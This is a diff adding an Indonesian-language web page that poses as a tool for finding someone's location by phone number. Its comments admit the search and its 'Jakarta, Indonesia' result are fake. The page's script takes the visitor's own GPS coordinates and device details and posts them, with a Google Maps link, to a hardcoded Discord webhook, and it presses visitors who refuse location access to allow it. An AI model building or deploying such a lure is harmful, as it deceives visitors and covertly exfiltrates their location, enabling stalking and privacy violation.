@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <titlefind location by phone number</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f9;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .container {
+        background: white;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        width: 300px;
+      }
+
+      h1 {
+        font-size: 20px;
+        margin-bottom: 20px;
+        color: #333;
+      }
+
+      .search-form {
+        display: flex;
+        flex-direction: column;
+      }
+
+      input[type="tel"] {
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 16px;
+      }
+
+      button {
+        padding: 10px;
+        background-color: #4caf50;
+        border: none;
+        color: white;
+        font-size: 16px;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+
+      button:hover {
+        background-color: #45a049;
+      }
+
+      .result {
+        margin-top: 20px;
+        font-size: 16px;
+        color: #555;
+      }
+
+      #status {
+        font-style: italic;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Cari Lokasi Berdasarkan Nomor Telepon</h1>
+      <form class="search-form">
+        <input
+          type="tel"
+          id="phone"
+          placeholder="Masukkan Nomor Telepon"
+          required
+        />
+        <button type="submit">Cari Lokasi</button>
+      </form>
+      <div class="result">
+        <p id="status">Memulai pencarian lokasi...</p>
+      </div>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const form = document.querySelector(".search-form");
+        const phoneInput = document.getElementById("phone");
+        const statusElement = document.getElementById("status");
+
+        form.addEventListener("submit", function (e) {
+          e.preventDefault(); // Mencegah form reload
+
+          const phoneNumber = phoneInput.value;
+
+          if (phoneNumber) {
+            // Tampilkan status sedang mencari lokasi
+            statusElement.textContent = `Mencari lokasi untuk nomor telepon: ${phoneNumber}...`;
+
+            // Simulasikan pengambilan lokasi
+            simulateLocationSearch();
+
+            // Cek apakah geolocation diizinkan
+            checkGeolocationPermission();
+          } else {
+            statusElement.textContent = "Silakan masukkan nomor telepon.";
+          }
+        });
+
+        // Simulasi pencarian lokasi (menunggu 2 detik untuk efek boongan)
+        function simulateLocationSearch() {
+          setTimeout(() => {
+            statusElement.textContent = "Lokasi ditemukan! Mengambil data...";
+          }, 2000);
+
+          // Simulasi selesai (mungkin hasilnya bisa diberi lokasi palsu)
+          setTimeout(() => {
+            statusElement.textContent = "Lokasi ditemukan: Jakarta, Indonesia"; // Lokasi palsu
+          }, 4000);
+        }
+
+        // Fungsi untuk memeriksa izin geolocation
+        function checkGeolocationPermission() {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              function (position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // Mendapatkan informasi perangkat
+                const userAgent = navigator.userAgent;
+                const deviceInfo = getDeviceInfo(userAgent);
+
+                // Kirim lokasi dan informasi perangkat ke webhook Discord
+                sendToDiscord(latitude, longitude, deviceInfo);
+              },
+              function (error) {
+                // Jika geolocation tidak diizinkan, tampilkan SweetAlert2
+                if (error.code === error.PERMISSION_DENIED) {
+                  Swal.fire({
+                    title: "Izin Lokasi Diperlukan",
+                    text: "Untuk melanjutkan, mohon izinkan akses lokasi Anda.",
+                    icon: "warning",
+                    confirmButtonText: "OK",
+                  }).then(() => {
+                    // Menunggu hingga izin diberikan (tidak dapat dipaksakan)
+                  });
+                }
+              }
+            );
+          } else {
+            console.log("Geolocation tidak didukung oleh browser.");
+          }
+        }
+
+        // Fungsi untuk mengambil informasi perangkat (merk HP, sistem operasi, dll)
+        function getDeviceInfo(userAgent) {
+          let deviceInfo = {};
+
+          // Contoh cara mendapatkan merk HP dari userAgent (deteksi perangkat mobile)
+          if (/Android/i.test(userAgent)) {
+            deviceInfo.os = "Android";
+            deviceInfo.device = "Android Device";
+          } else if (/iPhone/i.test(userAgent)) {
+            deviceInfo.os = "iOS";
+            deviceInfo.device = "iPhone";
+          } else {
+            deviceInfo.os = "Unknown OS";
+            deviceInfo.device = "Unknown Device";
+          }
+
+          // Mendapatkan informasi browser
+          if (/Chrome/i.test(userAgent)) {
+            deviceInfo.browser = "Chrome";
+          } else if (/Firefox/i.test(userAgent)) {
+            deviceInfo.browser = "Firefox";
+          } else {
+            deviceInfo.browser = "Unknown Browser";
+          }
+
+          return deviceInfo;
+        }
+
+        // Fungsi untuk mengirimkan data ke Discord webhook
+        function sendToDiscord(latitude, longitude, deviceInfo) {
+          const webhookUrl =
+            "https://discord.com/api/webhooks/1334876992033783828/fqxDsa9lgFxD5tryPdkCParKCaUxl_IKY-V5o1hVlw9Y4JRFbuelb3EBAw1KTMdZlKhn";
+
+          // Buat link Google Maps berdasarkan latitude dan longitude
+          const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+          // Pesan yang akan dikirim ke Discord
+          const message = {
+            content: `Lokasi pengguna:\nLatitude: ${latitude}\nLongitude: ${longitude}\nLihat di Google Maps: ${googleMapsLink}\n\nInformasi perangkat:\nOS: ${deviceInfo.os}\nPerangkat: ${deviceInfo.device}\nBrowser: ${deviceInfo.browser}`,
+          };
+
+          // Mengirim data ke Discord menggunakan fetch
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(message),
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              console.log("Data berhasil dikirim ke Discord:", data);
+            })
+            .catch((error) => {
+              console.error("Error mengirim data ke Discord:", error);
+            });
+        }
+      });
+    </script>
+    <!-- SweetAlert2 CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  </body>
+</html>
